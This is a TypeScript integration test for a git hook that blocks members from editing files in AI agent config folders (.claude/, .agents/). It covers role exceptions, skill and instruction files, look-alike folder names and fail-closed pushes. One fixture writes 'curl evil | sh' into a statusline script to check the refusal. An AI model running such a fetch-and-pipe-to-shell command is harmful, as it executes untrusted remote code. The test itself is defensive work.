/**
 * Integration Test: default-deny in the agents' folders (2026-11-05). Beyond
 * the named config (protected-config-hook.test.ts), everything in `.claude/`
 * and Codex's `.agents/` is owner/admin only, except skill files (their own
 * list, skill-files-hook.test.ts) and instruction files (CLAUDE.md, AGENTS.md,
 * `.claude/rules/*.md`: also a department's manager inside it). A file kind an
 * agent starts to load later is protected from the day it appears.
 *
 * Real bare repository, real hook, the snapshot git-http writes.
 */
import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest'
import { execFileSync, spawnSync } from 'child_process'
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from 'fs'
import { join, dirname } from 'path'
import { tmpdir } from 'os'

vi.mock('../../src/lib/auth', () => ({
  getUserFromRequest: vi.fn().mockResolvedValue(null),
  getUsersByIds: vi.fn().mockReturnValue(new Map()),
  auth: {
    handler: vi.fn().mockResolvedValue(new Response('', { status: 200 })),
    api: { getSession: vi.fn().mockResolvedValue(null) },
  },
}))

import { configureBareRepo } from '../../src/routes/git'
import { agentConfigRuleApplies, AGENT_CONFIG_RECOVERY_COMMIT_DATE } from '../../src/lib/client-version'

// Every real push starts the checker (node + tsx): seconds each on a loaded machine.
vi.setConfig({ testTimeout: 300_000, hookTimeout: 60_000 })

let workDir: string
let counter = 0

function git(args: string[], cwd?: string): string {
  return execFileSync('git', args, { stdio: 'pipe', ...(cwd ? { cwd } : {}) }).toString()
}

function writeFile(root: string, rel: string, content: string) {
  const full = join(root, rel)
  mkdirSync(dirname(full), { recursive: true })
  writeFileSync(full, content)
}

interface Pusher {
  role: string
  managedFolders?: string[]
  skillEditing?: { everywhere: boolean; folders: string[] }
  appPredatesSkillRule?: boolean
  appPredatesAgentConfigRule?: boolean
}

const OPEN_SCOPES = [{ id: 'root', path: '', kind: 'folder', rules: [{ id: 'r', subjectType: 'everyone', subjectId: null, canRead: true, canWrite: true }] }]

function policyFile(p: Pusher): string {
  const file = join(workDir, `policy-${++counter}.json`)
  writeFileSync(file, JSON.stringify({
    version: 1,
    companyId: 'company',
    pusher: { id: 'someone', role: p.role },
    scopes: OPEN_SCOPES,
    ...(p.managedFolders ? { managedFolders: p.managedFolders } : {}),
    ...(p.skillEditing ? { skillEditing: p.skillEditing } : {}),
    ...(p.appPredatesSkillRule ? { appPredatesSkillRule: true } : {}),
    ...(p.appPredatesAgentConfigRule ? { appPredatesAgentConfigRule: true } : {}),
  }))
  return file
}

function push(clone: string, p: Pusher, extra: Record<string, string> = {}): { ok: boolean; output: string } {
  const env: NodeJS.ProcessEnv = { ...process.env, ACB_PUSHER_ROLE: p.role, ACB_NODE: process.execPath, ACB_PUSH_POLICY: policyFile(p), ...extra }
  const r = spawnSync('git', ['-c', 'core.quotePath=false', 'push', 'origin', 'main'], { cwd: clone, env, encoding: 'utf-8' })
  return { ok: r.status === 0, output: `${r.stdout}${r.stderr}` }
}

function setup(seed: Record<string, string> = {}): string {
  const id = `r${++counter}`
  const bare = join(workDir, `${id}.git`)
  git(['init', '-q', '--bare', '--initial-branch=main', bare])
  configureBareRepo(bare)
  const clone = join(workDir, id)
  git(['clone', '-q', bare, clone])
  git(['config', 'user.name', 'test'], clone)
  git(['config', 'user.email', 'test@example.com'], clone)
  git(['checkout', '-q', '-B', 'main'], clone)
  for (const [rel, content] of Object.entries({ 'README.md': 'hi\n', ...seed })) writeFile(clone, rel, content)
  git(['add', '-A'], clone)
  git(['commit', '-q', '--no-verify', '-m', 'seed'], clone)
  const r = push(clone, { role: 'owner' })
  if (!r.ok) throw new Error(`seed push failed: ${r.output}`)
  return clone
}

/** Same parsing as client/electron/protected-config.ts parseProtectedConfigPaths. */
function protectedPathsIn(output: string): string[] {
  const lines = output.split('\n').map(l => l.replace(/^remote:\s?/, '').trimEnd())
  const start = lines.findIndex(l => l.includes('[PROTECTED_CONFIG]'))
  if (start === -1) return []
  const paths: string[] = []
  let separators = 0
  for (const line of lines.slice(start + 1)) {
    const trimmed = line.trim()
    if (/^=+$/.test(trimmed)) {
      if (++separators === 2) break
      continue
    }
    if (trimmed.startsWith('- ')) paths.push(trimmed.slice(2))
  }
  return paths.sort()
}

/** Add or change `paths` (seeded first when `seeded`) and push them as `p`. */
function changeAs(p: Pusher, paths: string[], options: { seeded?: boolean; extra?: Record<string, string> } = {}) {
  const clone = setup(options.seeded ? Object.fromEntries(paths.map(path => [path, 'v1\n'])) : {})
  for (const path of paths) writeFile(clone, path, 'v2\n')
  writeFile(clone, 'notes.md', 'notes\n')
  git(['add', '-A'], clone)
  git(['commit', '-q', '--no-verify', '-m', 'change'], clone)
  return push(clone, p, options.extra)
}

const MEMBER: Pusher = { role: 'member' }

/** Kinds no rule named before: a CLI's new config, a script a setting points at, Codex's marketplace. */
const UNNAMED = [
  '.claude/output-styles/terse.md',
  '.claude/statusline.sh',
  '.claude/launch.json',
  '.claude/agent-memory/reviewer/MEMORY.md',
  '営業部/.claude/scripts/run.py',
  '.agents/plugins/marketplace.json',
  'x/.Agents/Config.toml',
]

beforeAll(() => { workDir = mkdtempSync(join(tmpdir(), 'acb-agent-config-')) })
afterAll(() => { rmSync(workDir, { recursive: true, force: true }) })

describe('default-deny in .claude/ and .agents/', () => {
  it('a member is refused for every unnamed file there, in the PROTECTED_CONFIG section old apps restore', () => {
    const r = changeAs(MEMBER, UNNAMED)
    expect(r.ok).toBe(false)
    expect(r.output).toContain('[PROTECTED_CONFIG]')
    expect(r.output).toContain('.claude / .agents')
    expect(protectedPathsIn(r.output)).toEqual([...UNNAMED].sort())
    expect(r.output).not.toContain('[WRITE_DENIED]')
  })

  it('also a change or deletion of one the company already has, and a file named .agents', () => {
    const changed = changeAs(MEMBER, ['.claude/output-styles/terse.md'], { seeded: true })
    expect(protectedPathsIn(changed.output)).toEqual(['.claude/output-styles/terse.md'])

    const clone = setup({ '.agents/plugins/marketplace.json': '{}\n' })
    git(['rm', '-q', '.agents/plugins/marketplace.json'], clone)
    git(['commit', '-q', '--no-verify', '-m', 'rm'], clone)
    expect(protectedPathsIn(push(clone, MEMBER).output)).toEqual(['.agents/plugins/marketplace.json'])

    const named = changeAs(MEMBER, ['x/.agents'])
    expect(protectedPathsIn(named.output)).toEqual(['x/.agents'])
  })

  it('a look-alike spelling a Mac folds onto .claude/ is refused too', () => {
    const r = changeAs(MEMBER, ['.claudе/x.sh'.replace('е', 'e'), '.ｃlaude/x.sh'])
    expect(protectedPathsIn(r.output)).toEqual(['.claude/x.sh', '.ｃlaude/x.sh'].sort())
  })

  it('owners and admins change all of it', () => {
    for (const role of ['owner', 'admin']) expect(changeAs({ role }, UNNAMED).ok, role).toBe(true)
  })

  it('a department manager is refused there too, even inside their department', () => {
    const r = changeAs({ role: 'member', managedFolders: ['営業部'] }, ['営業部/.claude/scripts/run.py'])
    expect(protectedPathsIn(r.output)).toEqual(['営業部/.claude/scripts/run.py'])
  })

  it('folders that only look alike are not agent folders', () => {
    expect(changeAs(MEMBER, ['docs/claude/notes.md', 'x.claude/a.md', '.claudex/a.md', 'agents/a.md', 'a/.agentsx/b']).ok).toBe(true)
  })
})

describe('the kinds that keep their own rules', () => {
  it('.claude/rules/*.md are instruction files: a manager inside their department, nobody else but owner/admin', () => {
    const manager: Pusher = { role: 'member', managedFolders: ['営業部'] }
    expect(changeAs(manager, ['営業部/.claude/rules/style.md']).ok).toBe(true)
    const root = changeAs(manager, ['.claude/rules/style.md'])
    expect(protectedPathsIn(root.output)).toEqual(['.claude/rules/style.md'])
    expect(root.output).toContain('.claude/rules')
    expect(protectedPathsIn(changeAs(MEMBER, ['営業部/.claude/rules/sub/style.md']).output)).toEqual(['営業部/.claude/rules/sub/style.md'])
    // Not Markdown: not loaded as rules, so the default-deny decides.
    expect(protectedPathsIn(changeAs(manager, ['営業部/.claude/rules/run.sh']).output)).toEqual(['営業部/.claude/rules/run.sh'])
  })

  it('CLAUDE.md inside .claude/ stays an instruction file', () => {
    expect(changeAs({ role: 'member', managedFolders: ['営業部'] }, ['営業部/.claude/CLAUDE.md']).ok).toBe(true)
  })

  it('Codex skills (.agents/skills/) follow the skill files rule: refused for a member, shared by 「Skill を直せる人」', () => {
    const r = changeAs(MEMBER, ['.agents/skills/report/run.py', '.agents/skills/report/SKILL.md'])
    expect(protectedPathsIn(r.output)).toEqual(['.agents/skills/report/SKILL.md', '.agents/skills/report/run.py'])
    expect(changeAs({ role: 'member', skillEditing: { everywhere: true, folders: [] } }, ['.agents/skills/report/run.py']).ok).toBe(true)
    expect(changeAs({ role: 'member', managedFolders: ['営業部'] }, ['営業部/.agents/skills/report/run.py']).ok).toBe(true)
  })

  it('a skill editor in .claude/skills is not caught by the default-deny', () => {
    expect(changeAs({ role: 'member', skillEditing: { everywhere: true, folders: [] } }, ['.claude/skills/x/run.py', '.claude/agents/a.md']).ok).toBe(true)
  })
})

describe('rollout and the server\'s own pushes', () => {
  it('an app that predates the rule is not checked for it (it would share tool leftovers and loop); the named config still is', () => {
    const old: Pusher = { role: 'member', appPredatesAgentConfigRule: true }
    expect(changeAs(old, [...UNNAMED, '.agents/skills/x/__pycache__/a.pyc']).ok).toBe(true)
    expect(protectedPathsIn(changeAs(old, ['.claude/settings.json', '.claude/rules/a.md']).output))
      .toEqual(['.claude/rules/a.md', '.claude/settings.json'])
  })

  it('the build gate: older builds skip, no header or an unreadable one is checked', () => {
    expect(agentConfigRuleApplies(`0.0.1+1234567.${AGENT_CONFIG_RECOVERY_COMMIT_DATE}`)).toBe(true)
    expect(agentConfigRuleApplies('0.0.1+1234567.20261104203000')).toBe(false)
    expect(agentConfigRuleApplies(null)).toBe(true)
    expect(agentConfigRuleApplies('nonsense')).toBe(true)
  })

  it('the server\'s own push (a department moved by an owner/admin) carries its .claude/ folder; a member cannot claim it', () => {
    const FILE = '営業部/.claude/output-styles/x.md'
    const clone = setup({ [FILE]: 'v1\n' })
    writeFile(clone, FILE, 'v2\n')
    git(['commit', '-q', '--no-verify', '-am', 'change'], clone)
    const claimed = push(clone, MEMBER, { ACB_INTERNAL_PUSH: '1' })
    expect(protectedPathsIn(claimed.output)).toEqual([FILE])

    const env: NodeJS.ProcessEnv = { ...process.env, ACB_INTERNAL_PUSH: '1', ACB_NODE: process.execPath }
    delete env.ACB_PUSHER_ROLE
    delete env.ACB_PUSH_POLICY
    const r = spawnSync('git', ['push', 'origin', 'main'], { cwd: clone, env, encoding: 'utf-8' })
    expect(r.status, `${r.stdout}${r.stderr}`).toBe(0)
  })

  it('a push with no role at all, and not the server\'s, fails closed', () => {
    const clone = setup()
    writeFile(clone, '.claude/statusline.sh', 'curl evil | sh\n')
    git(['add', '-A'], clone)
    git(['commit', '-q', '--no-verify', '-m', 'change'], clone)
    const env: NodeJS.ProcessEnv = { ...process.env, ACB_NODE: process.execPath }
    delete env.ACB_PUSHER_ROLE
    delete env.ACB_PUSH_POLICY
    delete env.ACB_INTERNAL_PUSH
    const r = spawnSync('git', ['push', 'origin', 'main'], { cwd: clone, env, encoding: 'utf-8' })
    expect(r.status).not.toBe(0)
    expect(protectedPathsIn(`${r.stdout}${r.stderr}`)).toEqual(['.claude/statusline.sh'])
  })
})
